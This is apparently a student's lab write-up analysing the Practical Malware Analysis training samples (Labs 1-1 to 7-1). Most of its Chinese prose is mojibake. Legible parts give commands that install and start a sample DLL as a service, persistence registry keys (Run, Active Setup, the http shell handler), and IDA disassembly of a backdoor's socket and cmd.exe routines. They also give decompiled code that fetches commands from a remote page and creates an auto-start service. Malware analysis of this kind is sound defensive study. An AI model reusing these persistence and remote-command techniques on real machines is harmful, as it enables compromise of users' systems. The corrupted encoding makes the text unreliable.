3ã€è¿™ä¸ªæ–‡ä»¶æ˜¯ä»€ä¹ˆæ—¶å€™è¢«ç¼–è¯‘çš„ï¼Ÿ 4ã€æœ‰æ²¡æœ‰ä»»ä½•å¯¼å…¥å‡½æ•°èƒ½å¤Ÿæš—ç¤ºå‡ºè¿™ä¸ªç¨‹åºçš„åŠŸèƒ½ï¼Ÿå¦‚æœæ˜¯ï¼Œæ˜¯å“ªäº›å¯¼å…¥å‡½æ•°ï¼Œä»–ä»¬ä¼šå‘Šè¯‰ä½ ä»€ä¹ˆï¼Ÿ 5ã€å“ªäº›åŸºäºä¸»æœºæˆ–åŸºäºç½‘ç»œçš„è¿¹è±¡å¯ä»¥è¢«ç”¨æ¥ç¡®å®šè¿™ä¸ªæ¶æ„ä»£ç æ„ŸæŸ“çš„æœºå™¨ï¼Ÿ 6ã€è¿™ä¸ªæ–‡ä»¶åœ¨èµ„æºæ®µä¸­åŒ…å«ä¸€ä¸ªèµ„æºï¼Œä½¿ç”¨Restoratorå·¥å…·æ¥æ£€æŸ¥èµ„æºï¼Œç„¶åæŠ½å–èµ„æºã€‚ä»èµ„æºä¸­ä½ èƒ½å‘ç°ä»€ä¹ˆå—ï¼Ÿ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ![image](https://c65mael.github.io/static/myassets-Lab/1-1 17.png)\nç”¨dieæŸ¥çœ‹ä¸€ä¸‹ï¼Œæ²¡æœ‰å£³å§ï¼Œä½†å‘ç°ä¸€ä¸ªPEèµ„æºï¼Œå¯ä»¥ä½¿ç”¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 18.png)\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 22.png)\nå…¨é€‰åè½¬å‚¨å‡ºæ¥ã€‚\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 19.png)\nåœ¨å¯¼å…¥è¡¨ä¸­æ‰¾åˆ°å¦‚ä¸‹å‡½æ•°ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 20.png)\nè¿™ä¸ªapiæ˜¯ä»ç½‘ç»œä¸Šä¸‹è½½æ–‡ä»¶å¹¶ä¿å­˜åˆ°æœ¬åœ°çš„ä¸€ä¸ªæ“ä½œã€‚\nç”¨è®°äº‹æœ¬æ‰“å¼€æ‹¿ä¸ªæˆ‘ä»¬è½¬å‚¨çš„æ–‡ä»¶ï¼Œå¯ä»¥çœ‹åˆ°ä¸€ä¸ªç½‘å€ï¼Œå¯èƒ½æ˜¯ç”¨ä¸Šé¢é‚£ä¸ªapiä¸‹è½½äº†è¿™ä¸ªç¨‹åºï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/1-1 21.png)\nå¥½å§ï¼Œç¬¬äºŒæ­¥å¥½åƒå·²ç»æŠ½å–å®Œèµ„æºäº†ï¼Œå®˜æ–¹æ–‡æ¡£ã€‚\nLab 3-1 ---------------- Lab03-01.exe ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€æ‰¾å‡ºè¿™ä¸ªæ¶æ„ä»£ç çš„å¯¼å…¥å‡½æ•°ä¸å­—ç¬¦ä¸²åˆ—è¡¨ï¼Ÿ 2ã€è¿™ä¸ªæ¶æ„ä»£ç åœ¨ä¸»æœºä¸Šçš„æ„ŸæŸ“ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ 3ã€è¿™ä¸ªæ¶æ„ä»£ç æ˜¯å¦å­˜åœ¨ä¸€äº›æœ‰ç”¨çš„ç½‘ç»œç‰¹å¾ç ï¼Ÿå¦‚æœå­˜åœ¨ï¼Œä»–ä»¬æ˜¯ä»€ä¹ˆï¼Ÿ -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ä½¿ç”¨dieæŸ¥çœ‹å¯¼å…¥è¡¨ï¼Œå‘ç°åªæœ‰ä¸€ä¸ªå‡½æ•°ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-1 1.png)\nExitProcessæ˜¯é€€å‡ºè¿›ç¨‹ç›¸å…³çš„apiå‡½æ•°ï¼Œå­—ç¬¦ä¸²å¯ä»¥æ‰¾åˆ°å¦‚ä¸‹ï¼š\nSOFTWARE\\Classes\\http\\shell\\open\\commandV Software\\Microsoft\\Active Setup\\Installed Components\\ www.practicalmalwareanalysis.com SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders SOFTWARE\\Classes\\http\\shell\\open\\command\nç”¨é€”ï¼š\nè¿™ä¸ªæ³¨å†Œè¡¨è·¯å¾„å®šä¹‰äº†ç³»ç»Ÿå¦‚ä½•å¤„ç† http åè®®çš„é“¾æ¥ã€‚ command å­é”®åŒ…å«ä¸€ä¸ªå­—ç¬¦ä¸²å€¼ï¼ŒæŒ‡å®šäº†å½“ç”¨æˆ·ç‚¹å‡»ä¸€ä¸ª HTTP é“¾æ¥æ—¶è¦æ‰§è¡Œçš„å‘½ä»¤ã€‚ åˆ†æï¼š\næµè§ˆå™¨é»˜è®¤åº”ç”¨ç¨‹åºè®¾ç½®ï¼šé€šå¸¸ï¼Œè¿™é‡Œä¼šè®¾ç½®ä¸ºæŸä¸ªæµè§ˆå™¨çš„å¯æ‰§è¡Œæ–‡ä»¶è·¯å¾„ï¼Œæ¯”å¦‚ C:\\Program Files (x86)\\Google\\Chrome\\Application\\chrome.exeã€‚ æ¶æ„è½¯ä»¶å¯èƒ½ä¼šä¿®æ”¹è¿™ä¸ªé”®ï¼Œä»¥ä¾¿åŠ«æŒ HTTP é“¾æ¥ï¼Œé‡å®šå‘åˆ°æ¶æ„ç½‘ç«™æˆ–æ‰§è¡Œæ¶æ„ç¨‹åºã€‚ *Software\\Microsoft\\Active Setup\\Installed Components*\nç”¨é€”ï¼š\nActive Setup ç”¨äºåœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œé…ç½®ä»»åŠ¡å’Œæ›´æ–°ã€‚ Installed Components ä¸‹çš„æ¯ä¸ªå­é”®å¯¹åº”ä¸€ä¸ªå·²å®‰è£…çš„ç»„ä»¶ï¼Œè¿™äº›ç»„ä»¶å¯ä»¥åœ¨ç”¨æˆ·é¦–æ¬¡ç™»å½•æ—¶æ‰§è¡Œç‰¹å®šçš„é…ç½®æ“ä½œã€‚ åˆ†æï¼š\nç³»ç»Ÿç»„ä»¶å’Œåº”ç”¨ç¨‹åºå¯èƒ½ä¼šåœ¨æ­¤æ³¨å†Œè¡¨è·¯å¾„ä¸‹åˆ›å»ºå­é”®ï¼Œä»¥ä¾¿åœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œç‰¹å®šä»»åŠ¡ã€‚ æ¶æ„è½¯ä»¶ä¹Ÿå¯èƒ½åˆ©ç”¨è¿™ä¸ªè·¯å¾„ï¼Œåœ¨ç”¨æˆ·ç™»å½•æ—¶æ‰§è¡Œæ¶æ„ä»£ç ã€‚ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run\nç”¨é€”ï¼š\nè¿™ä¸ªæ³¨å†Œè¡¨è·¯å¾„åŒ…å«çš„å­é”®å®šä¹‰äº†åœ¨ç”¨æˆ·ç™»å½•æ—¶è‡ªåŠ¨å¯åŠ¨çš„ç¨‹åºã€‚ æ¯ä¸ªå­é”®çš„åç§°æ˜¯å¯åŠ¨é¡¹çš„åç§°ï¼Œå€¼æ˜¯è¦æ‰§è¡Œçš„ç¨‹åºçš„è·¯å¾„ã€‚ åˆ†æï¼š\nåˆæ³•çš„å¯åŠ¨é¡¹ï¼šä¾‹å¦‚ï¼Œé˜²ç—…æ¯’è½¯ä»¶ã€é©±åŠ¨ç¨‹åºç›¸å…³ç¨‹åºã€å³æ—¶é€šè®¯è½¯ä»¶ç­‰ã€‚ æ¶æ„è½¯ä»¶å¸¸å¸¸åœ¨è¿™é‡Œæ·»åŠ å¯åŠ¨é¡¹ï¼Œä»¥ä¾¿åœ¨ç”¨æˆ·æ¯æ¬¡ç™»å½•æ—¶è‡ªåŠ¨è¿è¡Œå…¶æ¶æ„ä»£ç ã€‚ SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Explorer\\Shell Folders\nç”¨é€”ï¼š\nè¿™ä¸ªæ³¨å†Œè¡¨è·¯å¾„å®šä¹‰äº†ç”¨æˆ·å¤–å£³æ–‡ä»¶å¤¹çš„ä½ç½®ï¼Œå¦‚æ¡Œé¢ã€æˆ‘çš„æ–‡æ¡£ã€æ”¶è—å¤¹ç­‰ã€‚ å­é”®å’Œå€¼å¯¹åº”äº†ç³»ç»Ÿå’Œç”¨æˆ·ç‰¹å®šçš„æ–‡ä»¶å¤¹è·¯å¾„ã€‚ æ‰€ä½¿ç”¨çš„å¥æŸ„è¡¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-1 2.png)\nå¬è¯´å®ƒåˆ›å»ºäº†ä¸€ä¸ªäº’æ–¥ä½“ï¼Œä½†æ˜¯æˆ‘è¿è¡Œèµ·æ¥è¿›ç¨‹å°±é€€å‡ºäº†ï¼Œæ²¡æœ‰çœ‹åˆ°æœ‰äº’æ–¥ä½“ã€‚ï¼ˆå¯èƒ½æ˜¯ä»€ä¹ˆåè°ƒè¯•ï¼Ÿï¼‰\nä¸æ˜ç™½\næ¶æ„è½¯ä»¶è§£æäº†åŸŸåwww.practicalmalwareanalysis.com\nLab 3-2 ---------------- Lab03-02.dll ---------------- -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= å®éªŒå†…å®¹ï¼š 1ã€ä½ æ€ä¹ˆæ ·è®©è¿™ä¸ªæ¶æ„ä»£ç è‡ªè¡Œå®‰è£…ï¼Ÿ 2ã€åœ¨å®‰è£…ä¹‹åï¼Œä½ å¦‚ä½•è®©è¿™ä¸ªæ¶æ„ä»£ç è¿è¡Œèµ·æ¥ï¼Ÿ 3ã€ä½ æ€ä¹ˆèƒ½æ‰¾åˆ°è¿™ä¸ªæ¶æ„ä»£ç æ˜¯åœ¨å“ªä¸ªè¿›ç¨‹ä¸‹è¿è¡Œçš„ï¼Ÿ 4ã€ä½ å¯ä»¥åœ¨Process Monitorå·¥å…·ä¸­è®¾ç½®ä»€ä¹ˆæ ·çš„è¿‡æ»¤å™¨ï¼Œæ‰èƒ½æ”¶é›†è¿™ä¸ªæ¶æ„ä»£ç çš„ä¿¡æ¯ï¼Ÿ 5ã€è¿™ä¸ªæ¶æ„ä»£ç åœ¨ä¸»æœºä¸Šçš„æ„ŸæŸ“è¿¹è±¡ç‰¹å¾æ˜¯ä»€ä¹ˆï¼Ÿ 6ã€è¿™ä¸ªæ¶æ„ä»£ç æ˜¯å¦å­˜åœ¨ä¸€äº›æœ‰ç”¨çš„ç½‘ç»œç‰¹å¾ç  -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= ä½¿ç”¨dieçœ‹ä¸€ä¸‹å¯¼å‡ºè¡¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 1.png)\nè¿™ä¸ªdllå¯èƒ½æ˜¯ä½¿ç”¨installå‡½æ•°è¿›è¡Œå®‰è£…çš„ï¼Œå†çœ‹ä¸€ä¸‹å¯¼å…¥è¡¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 2.png)\nå¯ä»¥çœ‹åˆ°ä¸€äº›å¯¹æ³¨å†Œè¡¨æ“ä½œçš„apiå’Œä¸€äº›å…³äºæœåŠ¡çš„ç›¸å…³æ“ä½œï¼Œè¿˜æœ‰å…³äºhttpçš„ç›¸å…³æ“ä½œï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 3.png)\næœç´¢å­—ç¬¦ä¸²å¯ä»¥çœ‹åˆ°ï¼Œæœ‰ä¸€ä¸ªå«svchostçš„exeæ–‡ä»¶ï¼Œæœ‰å¯èƒ½æ˜¯shellcodeåŠ è½½å™¨\nå®‰è£…dllæŒ‡ä»¤ï¼š\nrundll32.exe Lab03-02.dll,installA ä½¿ç”¨å¦‚ä¸‹å‘½ä»¤å¯åŠ¨ï¼š\nnet start IPRIP å¤šæ¬¡è¿è¡Œå®‰è£…æŒ‡ä»¤ï¼Œå¯ä»¥å‘ç°æœ‰å¤šä¸ªåä¸ºsvchost.exeçš„è¿›ç¨‹ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 5.png)\nè€Œä¸”è¿™äº›è¿›ç¨‹çš„IDå·æœ€å°çš„åªæœ‰ä¸€ä¸ª680çš„ï¼Œå…¶ä»–IDçš„è¿›ç¨‹åˆ™æ˜¯è½¯ä»¶åˆ›å»ºçš„ã€‚\nå› ä¸ºdllæ˜¯éœ€è¦exeåŠ è½½è¿è¡Œï¼Œæ‰€ä»¥æˆ‘ä»¬è®¾ç½®Process Nameä¸ºdllåå­—æ˜¯æ— æ•ˆçš„,è€Œæˆ‘ä»¬è¿™é‡Œçš„Process Nameæ˜¯svchost.exeï¼Œä½†æ˜¯ç³»ç»Ÿä¸­æœ‰å¾ˆå¤šçš„svchost.exeå¯¼è‡´æˆ‘ä»¬ä¸å¥½å®šä½ï¼Œè¿™é‡Œè§£å†³çš„åŠæ³•æ˜¯å¾—åˆ°è¿›ç¨‹çš„pid\næŸ¥çœ‹è½¯ä»¶çš„å­—ç¬¦ä¸²ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-2 4.png)\nå¯ä»¥çœ‹åˆ°å¯¹åº”çš„è§£æåŸŸåï¼Œè®¿é—®çš„http\nLab 3-3 ä¸»è¦çš„æ–‡ä»¶æ“ä½œï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 1.png)\nä¸ç†è§£ä¸ºä»€ä¹ˆæœ‰ä¸€å †Aï¼Œç”¨dieæŸ¥çœ‹å¯¼å…¥è¡¨ï¼Œå¯ä»¥å‘ç°æœ‰å†™è¿›ç¨‹å†…å­˜çš„å‡½æ•°ï¼Œæ¨æµ‹æœ‰å¯¹åº”çš„æ“ä½œï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 2.png)\nLab 3-4 è¿è¡Œåæœ‰è‡ªåˆ é™¤æ“ä½œã€‚\nå¯¼å…¥è¡¨ä¸­å¯¼å…¥äº†WS2_32.dllï¼Œå¯èƒ½æœ‰ä¸ç½‘ç»œäº¤äº’æ“ä½œã€‚\nåˆ†æè½¯ä»¶è¡Œä¸ºæ—¶å‘ç°è°ƒç”¨äº†cmd.exeï¼Œè¿™ä¸ªæŒ‡ä»¤åº”è¯¥æ˜¯è‡ªæˆ‘åˆ é™¤å§ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 3.png)\nå…¶ä½™çš„åŸºæœ¬æ“ä½œï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/3-3 4.png)\nä¸‹é¢çš„æ“ä½œéƒ½éœ€è¦ä½¿ç”¨idaäº†\nLab 5-1 ---------------- Lab05-01.dll ---------------- ä½¿ç”¨å·¥å…·ï¼š 1. IDA Pro -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= 1ã€DllMainçš„åœ°å€æ˜¯ä»€ä¹ˆï¼Ÿ 2ã€ä½¿ç”¨Importsçª—å£å¹¶æµè§ˆåˆ°çš„gethostbynameï¼Œå¯¼å…¥å‡½æ•°å®šä½åˆ°ä»€ä¹ˆåœ°å€ï¼Ÿ 3ã€æœ‰å¤šå°‘å‡½æ•°è°ƒç”¨äº†gethostbynameï¼Ÿ 4ã€å°†ç²¾åŠ›é›†ä¸­åœ¨ä½äº0x10001757å¤„çš„å¯¹gethostbynameçš„è°ƒç”¨ï¼Œä½ èƒ½æ‰¾å‡ºå“ªä¸ªDNSè¯·æ±‚å°†è¢«è§¦å‘å—ï¼Ÿ 5ã€IDA Proè¯†åˆ«äº†åœ¨0x10001656å¤„çš„å­è¿‡ç¨‹ä¸­çš„å¤šå°‘ä¸ªå±€éƒ¨å˜é‡ï¼Ÿ 6ã€IDA Proè¯†åˆ«äº†åœ¨0x10001656å¤„çš„å­è¿‡ç¨‹ä¸­çš„å¤šå°‘ä¸ªå‚æ•°ï¼Ÿ 7ã€ä½¿ç”¨Stringsçª—å£ï¼Œæ¥åœ¨åæ±‡ç¼–ä¸­å®šä½å­—ç¬¦ä¸²\\cmd.exe /c ã€‚å®ƒä½äºå“ªï¼Ÿ 8ã€åœ¨å¼•ç”¨\\cmd.exe /cçš„ä»£ç æ‰€åœ¨çš„åŒºåŸŸå‘ç”Ÿäº†ä»€ä¹ˆï¼Ÿ 9ã€åœ¨åŒä¸€çš„åŒºåŸŸï¼Œåœ¨0x100101C8å¤„ï¼Œçœ‹èµ·æ¥å¥½åƒæ˜¯dword_1008E5C4æ˜¯ä¸€ä¸ªå…¨å±€å˜é‡ï¼Œå®ƒå¸®åŠ©å†³å®šèµ°å“ªæ¡è·¯å¾„ã€‚é‚£æ¶æ„ä»£ç æ˜¯å¦‚ä½•è®¾ç½®dword_1008E5C4çš„å‘¢ï¼Ÿ(æç¤ºï¼šä½¿ç”¨dword_1008E5C4çš„äº¤å‰å¼•ç”¨ã€‚) -=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-=-= DllMainçš„åœ°å€ï¼š0x1000D02E\n.idata:100163CC\nctrl+xæ‰¾äº¤å‰å¼•ç”¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 1.png)\nè¿™ä¸ªåä¸º[This is RDO]pics.praticalmalwareanalysis.comå°†ä¼šè¢«è°ƒç”¨ï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 2.png)\nå¦‚ä¸‹ï¼š\n.text:10001656 ; =============== S U B R O U T I N E ======================================= .text:10001656 .text:10001656 .text:10001656 ; DWORD __stdcall sub_10001656(LPVOID lpThreadParameter) .text:10001656 sub_10001656 proc near ; DATA XREF: DllMain(x,x,x)+C8â†“o .text:10001656 .text:10001656 var_675 = byte ptr -675h .text:10001656 var_674 = dword ptr -674h .text:10001656 hModule = dword ptr -670h .text:10001656 timeout = timeval ptr -66Ch .text:10001656 name = sockaddr ptr -664h .text:10001656 var_654 = word ptr -654h .text:10001656 in = in_addr ptr -650h .text:10001656 Str1 = byte ptr -644h .text:10001656 var_640 = byte ptr -640h .text:10001656 CommandLine = byte ptr -63Fh .text:10001656 Str = byte ptr -63Dh .text:10001656 var_638 = byte ptr -638h .text:10001656 var_637 = byte ptr -637h .text:10001656 var_544 = byte ptr -544h .text:10001656 var_50C = dword ptr -50Ch .text:10001656 var_500 = byte ptr -500h .text:10001656 Buf2 = byte ptr -4FCh .text:10001656 readfds = fd_set ptr -4BCh .text:10001656 buf = byte ptr -3B8h .text:10001656 var_3B0 = dword ptr -3B0h .text:10001656 var_1A4 = dword ptr -1A4h .text:10001656 var_194 = dword ptr -194h .text:10001656 WSAData = WSAData ptr -190h .text:10001656 lpThreadParameter= dword ptr 4 DWORD __stdcall sub_10001656(LPVOID lpThreadParameter)ä¸€ä¸ªå‚æ•°\nxdoors_d:10095B34 aCmdExeC db '\\cmd.exe /c ',0 ; DATA XREF: sub_1000FF58+278â†‘o å¯ä»¥çœ‹åˆ°ä¸€ç³»åˆ—çš„linuxæŒ‡ä»¤ï¼Œå¯èƒ½å°±æ˜¯æ¨¡æ‹ŸLinux shellï¼š\n![image](https://c65mael.github.io/static/myassets-Lab/5-1 3.png)\nè·å–ç‰ˆæœ¬æ¶ˆæ¯ï¼š\n.text:10003695 ; =============== S U B R O U T I N E ======================================= .text:10003695 .text:10003695 ; Attributes: bp-based frame .text:10003695 .text:10003695 ; BOOL sub_10003695() .text:10003695 sub_10003695 proc near ; CODE XREF: sub_10001656+1Dâ†‘p .text:10003695 ; sub_10003B75+7â†“p ... .text:10003695 .text:10003695 VersionInformation= _OSVERSIONINFOA ptr -94h .text:10003695 .text:10003695 push ebp .text:10003696 mov ebp, esp .text:10003698 sub esp, 94h .text:1000369E lea eax, [ebp+VersionInformation] .text:100036A4 mov [ebp+VersionInformation.dwOSVersionInfoSize], 94h .text:100036AE push eax ; lpVersionInformation .text:100036AF call ds:GetVersionExA .text:100036B5 xor eax, eax .text:100036B7 cmp [ebp+VersionInformation.dwPlatformId], 2 .text:100036BE setz al .text:100036C1 leave .text:100036C2 retn .text:100036C2 sub_10003695 endp å¯èƒ½ä¼šæ£€æŸ¥ç¨‹åºæ˜¯å¦åœ¨Windows NT 4.0æˆ–æ›´æ—©çš„æ—¶å€™è¿è¡Œè¿™äº›ç‰ˆæœ¬æœ‰ä¸åŒçš„å¹³å°ID,è€Œä¸æ˜¯åæœŸç‰ˆæœ¬çš„Windowsã€‚è¿™ä¸ªå¯¹äºé‚£äº›ä¸è®¾è®¡ä»¥æ›´æ–°ç‰ˆæœ¬çš„æ—§ç¨‹åºæ¥è¯´æ˜¯æœ‰ç”¨çš„çª—æˆ·ã€‚\nLab 6-1 mainå‡½æ•°çš„ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š\nint sub_401000() { BOOL ConnectedState; // [esp+0h] [ebp-4h] ConnectedState = InternetGetConnectedState(0, 0); if ( ConnectedState ) { sub_40105F(aSuccessInterne, ConnectedState); return 1; } else { sub_40105F(aError11NoInter, 0); return 0; } } åœ¨0x40105fä¸­ï¼Œå‡½æ•°é€»è¾‘åƒä»æŸæŸè¯»å–å†…å®¹çš„æ“ä½œã€‚\næ•´ä¸ªå‡½æ•°é€»è¾‘å¤§æ¦‚ä¸ºå…ˆæ£€æŸ¥ç½‘ç»œæ˜¯å¦è¿æ¥ï¼Œå¦‚æœè¿æ¥ï¼Œåˆ™è¯»å–å­—ç¬¦ä¸²Success: Internet Connectionå¹¶æ‰“å°ï¼›å¦‚æœæ— æ³•è¿æ¥ï¼Œåˆ™è¯»å–å­—ç¬¦ä¸²Error 1.1: No Internetå¹¶æ‰“å°\nLab 6-2 mainå‡½æ•°çš„ä¸»è¦é€»è¾‘å¦‚ä¸‹ï¼š\nint __cdecl main(int argc, const char **argv, const char **envp) { char v4; // [esp+0h] [ebp-8h] if ( !sub_401000() ) return 0; v4 = sub_401040(); if ( v4 ) { sub_40117F(\"Success: Parsed command is %c\\n\", v4); Sleep(0xEA60u); } return 0; } è¿›è¡Œä¸¤ä¸ªifçš„åˆ¤æ–­æ“ä½œã€‚\nåœ¨0x40117fä¸­ï¼Œå‡½æ•°é€»è¾‘åƒæ‰“å°ä¼ å…¥çš„å‚æ•°ã€‚åœ¨è¿™ä¸ªå­å‡½æ•°ä¸­ä½¿ç”¨äº†switchåˆ¤æ–­æ“ä½œã€‚\nåœ¨0x401040ä¸­ï¼Œå‡½æ•°çš„é€»è¾‘åƒä½¿ç”¨ifæ¥æ£€æŸ¥htmlçš„è¿é€šæ€§ï¼ŒæˆåŠŸåˆ™ä¸‹è½½http://www.practicalmalwareanalysis.com/cc.htmï¼Œå¤±è´¥åˆ™æŠ¥é”™\nç½‘ç»œç‰¹å¾ä¸ºé¦–å…ˆæ˜¯æ‰“å¼€Internet Explorer 7.5/pmaï¼Œä¹‹åæ˜¯ä¸‹è½½http://www.practicalmalwareanalysis.com/cc.htm\né¦–å…ˆæ£€æŸ¥ç½‘ç»œè¿é€šæ€§ï¼Œå¦‚æœè¿é€šåˆ™ä¸‹è½½http://www.practicalmalwareanalysis.com/cc.htmï¼Œè®©åè¾“å‡ºåˆ°å±å¹•:Success: Parsed command is ï¼ˆè¿™ä¸ªæ–‡ä»¶ï¼‰å¹¶ä¼‘çœ 1åˆ†é’Ÿï¼›å¦‚æœä¸è¿é€šåˆ™é€€å‡ºã€‚\nLab 6-3 ç›¸æ¯”6-2å¤šè°ƒç”¨äº†ä¸€ä¸ªsub_401130(v4, *argv);å‡½æ•°ã€‚\nå…¶ä¸­ä¸€ä¸ªå‚æ•°(v4)æ˜¯æœ‰å…³ä¸‹è½½çš„htlmä¸­çš„å€¼ï¼Œå¦ä¸€ä¸ªå‚æ•°(*argv)æ˜¯ç»ˆç«¯ä¸­æ‰§è¡Œæ–‡ä»¶åè·Ÿçš„å‚æ•°ã€‚è¿™ä¸ªå‡½æ•°é‡Œé¢ä½¿ç”¨switchè¿›è¡Œåˆ¤æ–­ã€‚åˆ¤æ–­ç”¨æˆ·è¾“å…¥çš„å‚æ•°æ¥æ‰§è¡Œç›¸åº”çš„æ“ä½œï¼š\na:åˆ›å»ºä¸€ä¸ªæ–°çš„ç›®å½• CreateDirectoryAä¸PathNameæŒ‡å®šçš„è·¯å¾„ã€‚ b:å¤åˆ¶æ–‡ä»¶ ä½¿ç”¨CopyFileAä½¿ç”¨lpexiingfilenameæŒ‡å®šçš„æºæ–‡ä»¶å,å’Œæ•°æ®æŒ‡å®šçš„ç›®æ ‡æ–‡ä»¶åã€‚ c:åˆ é™¤ä½¿ç”¨æ–‡ä»¶ DeleteFileAä¸æ•°æ®æŒ‡å®šçš„æ–‡ä»¶è·¯å¾„ã€‚ d:æ‰“å¼€æ³¨å†Œè¡¨ é”®ä½¿ç”¨RegOpenKeyExAä½¿ç”¨å­é”®æŒ‡å®šçš„å…³é”®åç§°,å¹¶è®¾ç½®ValueNameçš„å€¼åˆ°æ•°æ®çš„å†…å®¹ã€‚å¦‚æœè¿™ä¸ªæ“ä½œå¤±è´¥äº†ï¼Œåˆ™è°ƒç”¨sub_401271é”™è¯¯æ¶ˆæ¯ã€‚ e:ç¡çœ æ—¶é—´ä¸º100ç§’ ä½¿ç”¨ç¡çœ ã€‚ æœ¬åœ°çš„ç‰¹ç‰¹å¾æ˜¯åœ¨æ³¨å†Œè¡¨ä¸­æ·»åŠ é”®Software\\Microsoft\\Windows\\CurrentVersion\\Run\\Malwareä¹Ÿå°±æ˜¯æ·»åŠ åˆ°å¼€æœºè‡ªå¯åŠ¨ã€‚\nè¯¥ç¨‹åºå…ˆæ£€æŸ¥æ˜¯å¦å­˜åœ¨æœ‰æ•ˆçš„Internetè¿æ¥ã€‚å¦‚æœæ‰¾ä¸åˆ°ï¼Œç¨‹åºç›´æ¥ç»ˆæ­¢ã€‚å¦åˆ™ï¼Œæ”¹ç¨‹åºä¼šå°è¯•ä¸‹è½½ä¸€ä¸ªç½‘é¡µï¼Œè¯¥ç½‘é¡µåŒ…å«ä¸€æ®µä»¥\u003c!â€“å¼€å¤´çš„HTMLæ³¨é‡Šã€‚è¯¥æ³¨é‡Šçš„ç¬¬ä¸€ä¸ªå­—ç¬¦è¢«ç”¨äºswitchè¯­å¥æ¥å†³å®šç¨‹åºåœ¨æœ¬åœ°ç³»ç»Ÿè¿è¡Œçš„ä¸‹ä¸€æ­¥è¡Œä¸ºï¼ŒåŒ…æ‹¬æ˜¯å¦åˆ é™¤ä¸€ä¸ªæ–‡ä»¶ã€åˆ›å»ºä¸€ä¸ªç›®å½•ã€è®¾ç½®ä¸€ä¸ªæ³¨å†Œè¡¨runé”®ã€å¤åˆ¶ä¸€ä¸ªæ–‡ä»¶æˆ–è€…ä¼‘çœ 100ç§’ã€‚\nLab 6-4 ä¸6-3ç›¸æ¯”æ·»åŠ äº†ä¸€ä¸ªå¾ªç¯çš„æ¬¡æ•°ï¼Œå¾ªç¯1441æ¬¡6-3çš„é€»è¾‘ã€‚ä¸€æ¬¡å¾ªç¯ä¼‘çœ 1åˆ†é’Ÿï¼Œåˆ™æ‰§è¡Œå®Œéœ€è¦24å°æ—¶ï¼Œå¹¶ä¸”User-Agentä¸­æ·»åŠ äº†è¿è¡Œæ—¶é—´çš„åˆ†é’Ÿæ•°ã€‚\nLab 7-1 ç¨‹åºé¦–å…ˆå®šä¹‰äº†ä¸€ä¸ªåä¸ºMalServiceçš„æœåŠ¡ï¼š\nServiceStartTable.lpServiceName = aMalservice; ä¹‹åç¨‹åºå°è¯•è·å–ä¸€ä¸ªåä¸ºHGL345çš„äº’æ–¥ä½“ï¼Œå¦‚æœå­˜åœ¨åˆ™é€€å‡ºï¼š\nif ( OpenMutexA(0x1F0001u, 0, Name) ) ExitProcess(0); å¦‚æœä¸å­˜åœ¨ï¼Œåˆ™åˆ›å»ºä¸€ä¸ªäº’æ–¥ä½“ï¼š\nCreateMutexA(0, 0, Name); ä¹‹åæ‰“å¼€SCMï¼ˆç³»ç»Ÿæ§åˆ¶ç®¡ç†å™¨ï¼‰ï¼š\nSCM = OpenSCManagerA(0, 0, 3u); è·å–å½“å‰è¿›ç¨‹çš„handleï¼š\nGetCurrentProcess() è·å–å½“å‰æ¨¡å—åï¼Œå¹¶ä¸”åˆ›å»ºä¸€ä¸ªåä¸ºMalserviceçš„æœåŠ¡ï¼ŒCreateServiceAè¿™ä¸ªå‡½æ•°çš„ç¬¬å››ä¸ªå‚æ•°ä¸ºäºŒåˆ™ä»£è¡¨SERVICE_AUTO_STARTï¼š\nGetModuleFileNameA(0, Filename, 0x3E8u); CreateServiceA(SCM, DisplayName, DisplayName, 2u, 0x10u, 2u, 0, Filename, 0, 0, 0, 0, 0); 